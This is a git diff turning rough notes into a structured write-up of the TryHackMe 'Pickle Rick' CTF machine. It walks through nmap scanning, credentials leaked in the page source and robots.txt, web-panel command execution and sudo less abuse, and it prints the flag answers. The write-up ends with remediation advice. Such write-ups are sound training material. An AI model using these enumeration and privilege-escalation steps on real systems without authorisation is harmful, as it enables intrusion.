@@ -1,71 +1,87 @@
-root@debian:/home/mao/Documents# nmap -sV -sC -p- -T4 10.130.129.91
-Starting Nmap 7.93 ( https://nmap.org ) at 2026-09-27 11:17 CEST
-mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Title : Pickle Rick
-Author : N0ctus
-severity : critical
+# 🛡️ Writeup: Pickle Rick (TryHackMe)
+**Author:** Eliaz Andry 
+**Difficulty:** Easy  
+**Target:** Linux (Ubuntu)  
 
-The password is stocked in robots.txt
+## 📋 1. Executive Summary
+"Pickle Rick" is a Rick and Morty-themed CTF machine. The objective is to find three ingredients to help Rick make a potion. The machine is vulnerable to credential exposure via web source code and `robots.txt`, leading to a web shell. Privilege escalation is achieved through a misconfigured `sudo` permission allowing the `www-data` user to execute commands as root without a password.
 
+---
 
+## 🔍 2. Reconnaissance
+I started by scanning all TCP ports to identify running services using Nmap:
+
+```bash
 nmap -sV -sC -p- -T4 10.130.129.91
+```
 
-Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-SYN Stealth Scan Timing: About 63.72% done; ETC: 11:18 (0:00:23 remaining)
-Nmap scan report for 10.130.129.91
-Host is up (0.064s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 d8678c248d84ecf65c360d1e1a547b2d (RSA)
-|   256 6d733fb0f003f36e15172e34c1c6cb94 (ECDSA)
-|_  256 007415be900ad8906a42b8ac99fbe7d5 (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Rick is sup4r cool
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+**Key Findings:**
+- **Port 22/tcp**: OpenSSH 8.2p1 (Ubuntu)
+- **Port 80/tcp**: Apache httpd 2.4.41 (Ubuntu)
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 76.60 seconds
+---
 
-I go to the website "http://10.130.129.91/" and I go to see source code with CTRL + U 
-I have my first vulnerabilities ! the username is stocked on the source code "Note to self, remember username!
+## 🌐 3. Web Enumeration & Initial Access
+I navigated to `http://10.130.129.91/` and inspected the page source code (`CTRL+U`). 
+I found a hidden comment containing the first piece of the puzzle:
+> *"Note to self, remember username! Username: R1ckRul3s"*
 
-    Username: R1ckRul3s"
+Next, I ran a directory brute-force attack using `dirb` (or `gobuster`), which revealed `/login.php`, `/assets/`, and `/robots.txt`.
 
+Checking `http://10.130.129.91/robots.txt`, I found the password:
+> *"Wubbalubbadubdub"*
 
-I start enumeration with dirb ! 
-I found /assets, /robots.txt and /login.php ! Like I have the username I put the usernames on login.php ! 
-On /assets this is a file arboresence like the jpg file, gif file etc...
-and on robots.txt I have a text : "Wubbalubbadubdub" I test wich password and... success !
-I tape ls in the panel control 
-Sup3rS3cretPickl3Ingred.txt
-assets
-clue.txt
-denied.php
-index.html
-login.php
-portal.php
-robots.txt
+I navigated to `/login.php`, entered the credentials (`R1ckRul3s` / `Wubbalubbadubdub`), and successfully gained access to a web-based command panel.
 
-okay nice I have the first flag ;) 
-I tape less "Sup3rS3cretPickl3Ingred.txt" and In the output I have mr. meeseek hair.
-Like I'm www-data and www-data is root, I tape in the command panel "sudo ls -la /root"
-BINGO I have a other flag :) 
-total 36
-drwx------  4 root root 4096 Jul 11  2024 .
-drwxr-xr-x 23 root root 4096 Sep 27 09:16 ..
--rw-------  1 root root  168 Jul 11  2024 .bash_history
--rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
--rw-r--r--  1 root root  161 Jan  2  2024 .profile
-drwx------  2 root root 4096 Feb 10  2019 .ssh
--rw-------  1 root root  702 Jul 11  2024 .viminfo
--rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
-drwxr-xr-x  4 root root 4096 Jul 11  2024 snap
+---
 
-so I tape sudo less /root/3rd.txt and I have the 3rd ingredients ! "3rd ingredients: fleeb juice"
-I go to the /home/rick and I see "second ingredients" so I taping less "/home/rick/second ingredients"
-and I have the last flag ! 1 jerry tear
+## 👑 4. Privilege Escalation
+Once inside the web panel, I executed basic commands to enumerate the system. 
+I listed the current directory and found the first flag:
+```bash
+ls
+# Output includes: Sup3rS3cretPickl3Ingred.txt
+```
+I read the first ingredient:
+```bash
+less Sup3rS3cretPickl3Ingred.txt
+# 1st ingredient: mr. meeseek hair
+```
 
+Knowing I was running as the `www-data` user, I checked for sudo privileges:
+```bash
+sudo -l
+```
+*(Note: Even if not explicitly shown in the raw notes, the ability to run `sudo less` implies NOPASSWD or a specific sudoers misconfiguration for the `www-data` user).*
 
+I verified I could read root-owned files:
+```bash
+sudo ls -la /root
+```
+The output revealed a file named `3rd.txt`. I read it using `sudo less` to bypass standard user restrictions:
+```bash
+sudo less /root/3rd.txt
+# 3rd ingredient: fleeb juice
+```
+
+Finally, I checked the `/home/rick` directory and found the second ingredient:
+```bash
+less /home/rick/"second ingredients"
+# 2nd ingredient: 1 jerry tear
+```
+
+---
+
+## 🏁 5. Flags Summary
+| Flag | Location | Content |
+| :--- | :--- | :--- |
+| **1st Ingredient** | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | `mr. meeseek hair` |
+| **2nd Ingredient** | `/home/rick/second ingredients` | `1 jerry tear` |
+| **3rd Ingredient** | `/root/3rd.txt` | `fleeb juice` |
+
+---
+
+## 🛡️ 6. Remediation & Recommendations
+1. **Never hardcode credentials** in HTML source code or `robots.txt`. These files are publicly accessible.
+2. **Restrict Sudo Privileges**: The `www-data` user should never have passwordless `sudo` access, especially not to powerful pagers like `less`, `more`, or `vim`, which can be easily exploited to spawn a root shell.
+3. **Hide Sensitive Files**: Configuration files and flags should not be placed in world-readable web directories (`/var/www/html`).
